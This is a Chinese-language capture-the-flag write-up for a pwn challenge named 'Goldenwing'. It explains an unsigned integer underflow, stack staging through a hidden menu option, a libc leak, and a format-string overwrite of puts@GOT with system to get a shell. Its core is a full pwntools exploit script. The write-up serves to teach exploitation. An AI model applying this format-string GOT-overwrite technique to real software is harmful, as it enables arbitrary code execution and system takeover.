# Goldenwing

## 题目简述

菜单的练习功能只限制数值不能过大，却允许负数写入无符号 `hp` 和 `power`，可利用下溢迅速击败 Boss。隐藏菜单允许预先向栈上放置格式化字符串参数；胜利后有两次格式化字符串机会，结合可写 GOT，可先泄漏 libc，再把 `puts@GOT` 的低三字节改成 `system`。

## 解题过程

先输入负数使无符号属性绕回极大值。随后选择隐藏项 `0xcafebabe`，把以下数据放到未来格式化字符串的第 17、18 个参数附近：

```text
/bin/sh\x00 | puts@GOT | puts@GOT+1
```

第一次格式化字符串用 `%3$p` 泄漏位于 `write+23` 的 libc 返回地址。第二次写 GOT 时，不宜用一次四字节 `%n`，因为可能需要打印数亿字符；把三字节拆成“最低一字节 `%hhn`”和“其后两字节 `%hn`”即可。

```python
from pwn import ELF, p64, remote

elf = ELF("./pwn")
libc = ELF("./libc.so.6", checksec=False)
io = remote("host", 10000)

io.sendlineafter(b"continue", b"")
io.sendlineafter(b"Choice", b"2")
io.sendlineafter(b"hp", b"-100")
io.sendlineafter(b"power", b"-100")

io.sendlineafter(b"Choice", str(0xCAFEBABE).encode())
staged = b"/bin/sh\x00" + p64(elf.got["puts"]) + p64(elf.got["puts"] + 1)
io.sendlineafter(b"here", staged)

io.sendlineafter(b"Choice", b"3")
io.sendlineafter(b"them", b"%3$p")
io.recvuntil(b"0x")
libc.address = int(io.recvn(12), 16) - libc.sym["write"] - 23

system = libc.sym["system"]
low_byte = system & 0xFF
next_word = (system >> 8) & 0xFFFF

first_count = low_byte if low_byte else 0x100
second_count = (next_word - first_count) & 0xFFFF
if second_count == 0:
    second_count = 0x10000

payload = f"%{first_count}c%17$hhn"
payload += f"%{second_count}c%18$hn"
io.sendline(payload.encode())
io.interactive()
```

第二次格式化字符串结束后，程序执行原本的 `puts(buf)`；GOT 被改写后，它实际调用的是 `system(buf)`，而 `buf` 以 `/bin/sh` 开头。

## 方法总结

本题依次使用无符号下溢、预布置栈参数、libc 泄漏和分段 GOT 覆写。多字节格式化写应按小端序拆分，并用模 $2^8$ 或 $2^{16}$ 的累计输出数计算增量，避免负宽度和超大输出。
